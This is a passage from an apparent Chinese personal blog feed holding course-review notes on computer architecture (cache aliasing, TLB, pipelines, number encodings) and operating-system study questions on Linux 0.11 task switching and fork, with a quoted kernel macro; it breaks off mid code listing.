&lt;p&gt;考虑如下情况：&lt;br&gt;32位机器，虚地址V1：0xe0001120 虚地址V2：0xf0002120，都映射到物理地址P: 0x00000120。&lt;br&gt;页大小4KB，占地址的低12位。于是虚拟地址和物理地址的第12位一定相同。&lt;br&gt;当Cache每路的大小不超过页大小时，用来i n d e x indexindex的地址位在[ 11 ： 0 ] 之间，于是V1和V2的i n d e x indexindex相同，在Cache中索引到同一项，于是不会出现别名。 当Cache每路的大小超过页大小时，如每路容量8KB，用来i n d e x indexindex的地址位在[ 12 ： 0 ]之间。而V1和V2的第13位不同，于是索引到Cache的不同行，于是出现了同一物理地址的多处备份，也即别名。&lt;br&gt;为解决别名问题，引入软件的&lt;strong&gt;页着色&lt;/strong&gt;，它保证，在给虚拟地址分配物理地址时，如果两个虚拟地址映射到同一物理地址，要求两个虚拟地址的&lt;strong&gt;页着色位相同&lt;/strong&gt;，即上图中对应Cache I n d e x IndexIndex与P a g e − o f f s e t Page-offsetPage−offset之间差额的灰色部分相同。&lt;/p&gt;
&lt;h1 id=&#34;第十一章-存储管理&#34;&gt;&lt;a href=&#34;#第十一章-存储管理&#34; class=&#34;headerlink&#34; title=&#34;第十一章: 存储管理&#34;&gt;&lt;/a&gt;第十一章: 存储管理&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231225308131.png&#34; alt=&#34;image-20221231225308131&#34;&gt;&lt;/p&gt;
&lt;p&gt;16*4 + 128&lt;/p&gt;
&lt;p&gt;(64&amp;#x2F;2 + 64&amp;#x2F;2 ) * 3 + 64&lt;/p&gt;
&lt;p&gt;(64&amp;#x2F;2 + 64&amp;#x2F;2 ) * 3 + 64&lt;/p&gt;
&lt;p&gt;算的有点小问题….一个tlb项对应两个物理页才对&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101160302012.png&#34; alt=&#34;image-20230101160302012&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102112339663.png&#34; alt=&#34;image-20230102112339663&#34;&gt;&lt;/p&gt;
&lt;p&gt;ab都128页&lt;/p&gt;
&lt;p&gt;256次invalid&lt;/p&gt;
&lt;p&gt;refill的话 注意看两次循环是一个从头开始,一个从尾部开始,所以最后应该要有重叠的部分! &lt;/p&gt;
&lt;p&gt;应该是256-32&lt;/p&gt;
&lt;h1 id=&#34;20年题目&#34;&gt;&lt;a href=&#34;#20年题目&#34; class=&#34;headerlink&#34; title=&#34;20年题目&#34;&gt;&lt;/a&gt;20年题目&lt;/h1&gt;&lt;h2 id=&#34;1&#34;&gt;&lt;a href=&#34;#1&#34; class=&#34;headerlink&#34; title=&#34;1&#34;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231230312603.png&#34; alt=&#34;image-20221231230312603&#34;&gt;&lt;/p&gt;
&lt;p&gt;五级流水: 取址,译码,执行,访存,写会  IF,ID,EX,MEM,WB 英文全称是什么呢??&lt;/p&gt;
&lt;p&gt;指令相关: 数据相关、结构相关和控制相关&lt;/p&gt;
&lt;p&gt;数据相关: WAW,RAW,WAR&lt;/p&gt;
&lt;h2 id=&#34;2&#34;&gt;&lt;a href=&#34;#2&#34; class=&#34;headerlink&#34; title=&#34;2&#34;&gt;&lt;/a&gt;2&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231230617385.png&#34; alt=&#34;image-20221231230617385&#34;&gt;&lt;/p&gt;
&lt;p&gt;注意还要除 million, 10的6次方&lt;/p&gt;
&lt;p&gt;(1)&lt;/p&gt;
&lt;p&gt;A:2  B:4 C:3 MIPS&lt;/p&gt;
&lt;p&gt;(2) 都一样,因为运行时间一样&lt;/p&gt;
&lt;h2 id=&#34;3&#34;&gt;&lt;a href=&#34;#3&#34; class=&#34;headerlink&#34; title=&#34;3&#34;&gt;&lt;/a&gt;3&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231232854416.png&#34; alt=&#34;image-20221231232854416&#34;&gt;&lt;/p&gt;
&lt;p&gt;(1)&lt;/p&gt;
&lt;p&gt;原码: -2的63次方+1 ~ 2的63次方-1&lt;/p&gt;
&lt;p&gt;补码: -2的63次方 ~ 2的63次方-1&lt;/p&gt;
&lt;p&gt;(2)&lt;/p&gt;
&lt;p&gt;补码:1111 1111 ………………&lt;/p&gt;
&lt;p&gt;原码:1 0000000…… 1 &lt;/p&gt;
&lt;p&gt;所以是-1&lt;/p&gt;
&lt;h2 id=&#34;4&#34;&gt;&lt;a href=&#34;#4&#34; class=&#34;headerlink&#34; title=&#34;4&#34;&gt;&lt;/a&gt;4&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231233718027.png&#34; alt=&#34;image-20221231233718027&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101005546680.png&#34; alt=&#34;image-20230101005546680&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;5&#34;&gt;&lt;a href=&#34;#5&#34; class=&#34;headerlink&#34; title=&#34;5&#34;&gt;&lt;/a&gt;5&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231235002314.png&#34; alt=&#34;image-20221231235002314&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101005607162.png&#34; alt=&#34;image-20230101005607162&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-电路图&#34;&gt;&lt;a href=&#34;#6-电路图&#34; class=&#34;headerlink&#34; title=&#34;6 电路图&#34;&gt;&lt;/a&gt;6 电路图&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101234018491.png&#34; alt=&#34;image-20230101234018491&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;7-多处理器&#34;&gt;&lt;a href=&#34;#7-多处理器&#34; class=&#34;headerlink&#34; title=&#34;7 多处理器&#34;&gt;&lt;/a&gt;7 多处理器&lt;/h2&gt;&lt;h2 id=&#34;9-转移猜测&#34;&gt;&lt;a href=&#34;#9-转移猜测&#34; class=&#34;headerlink&#34; title=&#34;9 转移猜测&#34;&gt;&lt;/a&gt;9 转移猜测&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101150434124.png&#34; alt=&#34;image-20230101150434124&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;10&#34;&gt;&lt;a href=&#34;#10&#34; class=&#34;headerlink&#34; title=&#34;10&#34;&gt;&lt;/a&gt;10&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101005258347.png&#34; alt=&#34;image-20230101005258347&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101223241997.png&#34; alt=&#34;image-20230101223241997&#34;&gt;&lt;/p&gt;
&lt;p&gt;128+32invalid 64+32refill来着&lt;/p&gt;
&lt;h1 id=&#34;7788的存储&#34;&gt;&lt;a href=&#34;#7788的存储&#34; class=&#34;headerlink&#34; title=&#34;7788的存储&#34;&gt;&lt;/a&gt;7788的存储&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102010039930.png&#34; alt=&#34;image-20230102010039930&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以第十章第一题那三个如果都是32位处理器情况下tag都是31:12吗&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102010922731.png&#34; alt=&#34;image-20230102010922731&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102011212154.png&#34; alt=&#34;image-20230102011212154&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/16279B7395C9EEC8444656E5E73B12C4.jpg&#34; alt=&#34;16279B7395C9EEC8444656E5E73B12C4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102113847140.png&#34; alt=&#34;image-20230102113847140&#34;&gt;&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2022-12-26T08:03:28.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8B/</id>
        <title>ucas-操作系统-思考题下</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8B/"/>
        <content type="html">&lt;h1 id=&#34;21-进程0创建进程1时，为进程1建立了task-struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。&#34;&gt;&lt;a href=&#34;#21-进程0创建进程1时，为进程1建立了task-struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;21.进程0创建进程1时，为进程1建立了task_struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。&#34;&gt;&lt;/a&gt;21.进程0创建进程1时，为进程1建立了task_struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。&lt;/h1&gt;&lt;p&gt;p92&lt;/p&gt;
&lt;p&gt;第一页task_struct 就是进程1的&lt;/p&gt;
&lt;p&gt;第二页是和进程0一样的线性地址空间?&lt;/p&gt;
&lt;h1 id=&#34;22-假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。&#34;&gt;&lt;a href=&#34;#22-假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。&#34; class=&#34;headerlink&#34; title=&#34;22.假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。&#34;&gt;&lt;/a&gt;22.假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。&lt;/h1&gt;&lt;h1 id=&#34;23-代码中的”ljmp-0-n-t”-很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m”-amp-tmp-a-，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。&#34;&gt;&lt;a href=&#34;#23-代码中的”ljmp-0-n-t”-很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m”-amp-tmp-a-，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。&#34; class=&#34;headerlink&#34; title=&#34;23.代码中的”ljmp %0\n\t” 很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m” (*&amp;amp;__tmp.a)，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。&#34;&gt;&lt;/a&gt;23.代码中的”ljmp %0\n\t” 很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m” (*&amp;amp;__tmp.a)，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。&lt;/h1&gt;&lt;p&gt;p106\127&lt;/p&gt;
&lt;p&gt;include&amp;#x2F;linux&amp;#x2F;sched.h&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *	switch_to(n) should switch tasks to task nr n, first&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * checking that n isn&amp;#x27;t the current task, in which case it does nothing.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * This also clears the TS-flag if the task we switched to has used&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * tha math co-processor latest.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; switch_to(n) &amp;#123;\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;struct &amp;#123;long a,b;&amp;#125; __tmp; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__(&lt;span class=&#34;string&#34;&gt;&amp;quot;cmpl %%ecx,_current\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;je 1f\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%dx,%1\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;xchgl %%ecx,_current\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;//强行切到进程0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;ljmp %0\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;//第一次执行完 for pause 这一行执行完了执行 _syscall0的 if(__res &amp;gt;=0) || 看这里 copy_process: p-&amp;gt;tss.eip = eip; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;cmpl %%ecx,_last_task_used_math\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;//进程0回到for pause&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;jne 1f\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;clts\n&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;1:&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	::&lt;span class=&#34;string&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt; (*&amp;amp;__tmp.a),&lt;span class=&#34;string&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt; (*&amp;amp;__tmp.b), \ &lt;span class=&#34;comment&#34;&gt;//IA32 任务切换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt; (_TSS(n)),&lt;span class=&#34;string&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;) task[n])); \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		ljmp通过CPU的任务门机制并为实际使用任务门,它把CPU的各个寄存器值保存在当前进程的TSS中,将要转换的进程的TSS数据以及LDT的代码段、数据段描述符数据恢复给CPU的各个寄存器,从而实现进程的切换&lt;/p&gt;
&lt;p&gt;​		a代表EIP、b对应cs&lt;/p&gt;
&lt;h1 id=&#34;24-进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for-pause-，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。&#34;&gt;&lt;a href=&#34;#24-进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for-pause-，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;24.进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for(;;) pause()，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。&#34;&gt;&lt;/a&gt;24.进程0开始创建进程1，调用fork（），跟踪代码时我们发现，fork代码执行了两次，第一次，执行fork代码后，跳过init（）直接执行了for(;;) pause()，第二次执行fork代码后，执行了init（）。奇怪的是，我们在代码中并没有看到向转向fork的goto语句，也没有看到循环语句，是什么原因导致fork反复执行？请说明理由（可以图示），并给出代码证据。&lt;/h1&gt;&lt;p&gt;p2 p107&lt;/p&gt;
&lt;p&gt;​	这个题的话,需要追踪一下fork的流程&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span 